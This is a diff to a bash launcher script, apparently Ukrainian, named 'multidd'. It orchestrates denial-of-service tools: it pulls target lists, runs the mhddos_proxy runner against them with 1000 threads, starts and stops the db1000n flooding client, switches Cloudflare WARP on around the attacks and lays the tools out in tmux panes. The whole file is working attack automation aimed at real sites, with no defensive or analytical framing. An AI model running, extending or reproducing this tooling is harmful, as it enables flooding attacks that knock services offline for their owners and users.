@@ -68,33 +68,24 @@ export get_targets
 function launch () {
     # tmux mouse support
     grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
-
-    declare -a commands
-    commands+=("bash auto_bash.sh")
     tmux source-file ~/.tmux.conf > /dev/null 2>&1
-
     if [[ $gotop == "on" ]]; then
         if [ ! -f "/usr/local/bin/gotop" ]; then
             curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
             sudo dpkg -i gotop.deb
-            commands+=('gotop -sc solarized')
         fi
-    fi
-    if [[ $db1000n == "on" ]];
+        tmux new-session -s multidd -d 'gotop -sc solarized'
+        tmux split-window -h -p 66 'bash auto_bash.sh'
+    elif [[ $db1000n == "on" ]];
         then
-        commands+=('bash db1000n_launch.sh')
+        tmux new-session -s multidd -d 'bash auto_bash.sh'
+        tmux split-window -h -p 66 'db1000n'
     fi
-    tmux new-session -s multidd
-    for item in "${commands[@]}"
-    do
-        tmux split-window -v "$item"
-    done
-    tmux select-layout even-vertical
     tmux attach-session -t multidd
 }
 #########################################
 function cleanup() {
-    deactivate > /dev/null 2>&1
+    deactivate 
     if [[ $shape == "on" ]]; then
         IFACE=$(ip -o -4 route show to default | awk '{print $5}')
         sudo "$WS" -c -a "$IFACE"
@@ -119,7 +110,7 @@ fi
 sudo apt-get update -q -y > /dev/null 2>&1
 for packet in $packets
 do
-    printf "Встановлення %-10s..." "$packet"
+    printf "Встановлення %-10s" "$packet"
     sudo apt-get install -q -y "$packet" > /dev/null 2>&1
     printf "\t [OK]\n"
 done
@@ -201,6 +192,10 @@ while true; do
     then
         warp-cli connect
     fi
+    if [[ $db1000n == "on" ]]
+    then
+        ~/multidd/db1000n &
+    fi
     if [[ $ddos_size == "XS" ]]; then
         tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
         python3 "$runner" -c ~/multidd/targets/lite_targets.txt "$methods" -t 1000 $args_to_pass &
@@ -253,20 +248,16 @@ while true; do
     pkill -f start.py; pkill -f runner.py;
     get_targets
     rm -rf ~/multidd/mhddos_proxy/
+    if [[ $db1000n == "on" ]]
+    then
+        pkill -f db1000n
+    fi
     if [[ $cloudflare == "on" ]]
     then
         warp-cli disconnect
     fi
 done
 EOF
-cat > db1000n_launch.sh << 'EOF'
-    #!/bin/bash
-    echo -e "Затримка в 3 хвилини до старту db1000n"
-    sleep 180
-    ~/multidd/db1000n &
-
-EOF
-
 trap cleanup INT
 get_targets
 launch
